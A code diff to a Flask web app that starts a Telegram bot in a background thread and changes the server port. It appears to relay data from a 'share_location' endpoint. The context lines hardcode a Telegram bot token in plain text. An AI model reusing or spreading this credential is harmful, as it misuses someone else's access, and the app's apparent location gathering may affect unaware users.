@@ -1,5 +1,9 @@
 from flask import Flask, render_template, request, jsonify
-import os, base64, uuid, datetime, json, requests
+import os, base64, uuid, datetime, json, requests , threading
+from bot import app as telegram_app
+
+
+
 
 app = Flask(__name__)
 BOT_TOKEN = "8162029368:AAGPkNeKtZKjjqK9_bj0a1VlpviN45HJ-Ws"
@@ -105,6 +109,11 @@ def share_location():
         return jsonify({"status": "ok"})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+def run_bot():
+    telegram_app.run_polling()
 
+threading.Thread(target=run_bot).start()
 if __name__ == "__main__":
-    app.run(port=5000)
+    import os
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host="0.0.0.0", port=port)
